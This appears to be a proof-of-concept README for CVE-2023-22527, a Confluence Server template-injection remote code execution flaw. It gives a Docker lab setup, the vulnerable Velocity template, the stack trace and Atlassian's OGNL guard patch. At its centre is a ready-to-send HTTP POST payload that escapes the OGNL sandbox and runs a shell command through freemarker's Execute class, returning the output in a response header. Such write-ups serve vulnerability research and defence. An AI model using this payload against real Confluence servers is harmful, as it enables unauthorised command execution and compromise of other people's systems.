# CVE-2023-22527 Confluence RCE 
CVE-2023-22527 - RCE (Remote Code Execution) Vulnerability In Confluence Data Center and Confluence Server PoC

## References
[CVE-2023-22527 - RCE (Remote Code Execution) Vulnerability In Confluence Data Center and Confluence Server | Atlassian Support | Atlassian Documentation](https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html?subid=1812250057&jobid=106379017&utm_campaign=confluence-critical-advisory_EML-17850&utm_medium=email&utm_source=alert-email)

[CONFSERVER-93833\] RCE (Remote Code Execution) in Confluence Data Center and Server - CVE-2023-22527 - Create and track feature requests for Atlassian products.](https://jira.atlassian.com/browse/CONFSERVER-93833)

https://twitter.com/TheDFIRReport/status/1749066611678466205

[Atlassian Confluence - Remote Code Execution (CVE-2023-22527) (projectdiscovery.io)](https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/)

[Bypassing OGNL sandboxes for fun and charities - The GitHub Blog](https://github.blog/2023-01-27-bypassing-ognl-sandboxes-for-fun-and-charities/)

## Docker Env
```bash
docker compose up -d
```

## Debug
You can debug on port 5008

## Diff
![image-20240117093518010](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20240117093518010.png)

## Vulnerability location
./confluence/confluence/template/aui/text-inline.vm
```txt
#set( $labelValue = $stack.findValue("getText('$parameters.label')") )
#if( !$labelValue )
    #set( $labelValue = $parameters.label )
#end

#if (!$parameters.id)
    #set( $parameters.id = $parameters.name)
#end

<label id="${parameters.id}-label" for="$parameters.id">
$!labelValue
#if($parameters.required)
    <span class="aui-icon icon-required"></span>
    <span class="content">$parameters.required</span>
#end
</label>

#parse("/template/aui/text-include.vm")
```

## PoC
``` txt
POST /template/aui/text-inline.vm HTTP/1.1
Host: 192.168.31.3:8092
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 287

label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({"id"}))
```

## Self-check
in confluence/logs/confluence_access.2024-xx-xx.log
```txt
192.168.11.1 - [23/Jan/2024:06:04:42 +0000] "POST /template/aui/text-inline.vm HTTP/1.1" 200 28906 677 /template/aui/text-inline.vm http-nio-8090-exec-7 "-"
```

## Stack

`org.apache.struts2.views.velocity.StrutsVelocityContext#internalGet`

↓

`org.apache.struts2.views.jsp.ui.OgnlTool#findValue`

↓

`freemarker.template.utility.Execute `

↓

`java.lang.Runtime#exec(java.lang.String)`


## Keyword
Velocity,SSTI Injection

## Patch
``` java
package com.atlassian.confluence.impl.struts;

import java.util.Set;
import ognl.Node;
import org.apache.struts2.ognl.StrutsOgnlGuard;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class ConfluenceOgnlGuard extends StrutsOgnlGuard {
    private static final Logger LOG = LoggerFactory.getLogger(ConfluenceOgnlGuard.class);
    private static final Set<String> BLOCKED_VAR_REFS = Set.of("#context", "#request", "#parameters", "#session", "#application", "#attr");

    public ConfluenceOgnlGuard() {
    }

    protected boolean skipTreeCheck(Node tree) {
        return false;
    }

    protected boolean checkNode(Node node) {
        return super.checkNode(node) || this.isBlockedVarRef(node);
    }

    protected boolean isBlockedVarRef(Node node) {
        String nodeClassName = node.getClass().getName();
        if ("ognl.ASTVarRef".equals(nodeClassName)) {
            String varRefValue = node.toString();
            if (BLOCKED_VAR_REFS.contains(varRefValue)) {
                if (!"#attr".equals(varRefValue)) {
                    LOG.warn("Expression contains blocked var ref [{}]", varRefValue);
                }

                return true;
            }
        }

        return false;
    }
}
```
